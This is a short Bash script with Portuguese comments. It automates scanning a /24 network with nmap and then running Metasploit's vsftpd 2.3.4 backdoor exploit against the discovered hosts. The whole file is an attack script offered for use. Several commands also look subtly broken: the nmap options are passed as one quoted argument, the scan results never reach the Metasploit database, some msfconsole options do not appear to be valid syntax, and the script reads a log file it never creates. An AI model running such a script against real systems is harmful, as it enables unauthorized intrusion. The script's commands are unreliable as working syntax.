#!/bin/bash

# Define as variáveis
TARGET_NETWORK="192.168.1.0/24" # rede a ser analisada
OUTPUT_DIR="/tmp/metasploit-scan" # diretório para armazenar os resultados
MSF_PATH="/usr/bin/msfconsole" # caminho para o executável do Metasploit
NMAP_PATH="/usr/bin/nmap" # caminho para o executável do nmap
NMAP_OPTS="-sS -sV" # opções para a varredura de portas com o nmap
EXPLOIT_OPTS="-j" # opções para a execução de exploits com o Metasploit

# Cria o diretório de saída, se não existir
mkdir -p "$OUTPUT_DIR"

# Varre a rede em busca de hosts e serviços
echo "Varrendo rede $TARGET_NETWORK..."
"$NMAP_PATH" "$NMAP_OPTS" "$TARGET_NETWORK" -oA "$OUTPUT_DIR/nmap-scan"

# Identifica vulnerabilidades nos serviços encontrados
echo "Identificando vulnerabilidades com o Metasploit..."
"$MSF_PATH" -x "db_rebuild_cache; workspace -a scan; hosts -R; services -R; vulns -R; exit;" -q

# Explora as vulnerabilidades encontradas
echo "Explorando vulnerabilidades com o Metasploit..."
"$MSF_PATH" -x "db_rebuild_cache; workspace -a scan; vulns -c 'verified:true' -o exploit/unix/ftp/vsftpd_234_backdoor; use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS file:$OUTPUT_DIR/nmap-scan.gnmap; run $EXPLOIT_OPTS; exit;" -q

# Exibe os resultados
echo "Resultados da varredura:"
cat "$OUTPUT_DIR/nmap-scan.gnmap"
echo "Resultados da identificação de vulnerabilidades:"
"$MSF_PATH" -x "db_rebuild_cache; workspace -a scan; vulns -o -f csv > $OUTPUT_DIR/vulns.csv; exit;" -q
echo "Resultados da exploração de vulnerabilidades:"
cat "$OUTPUT_DIR/msfconsole.log"
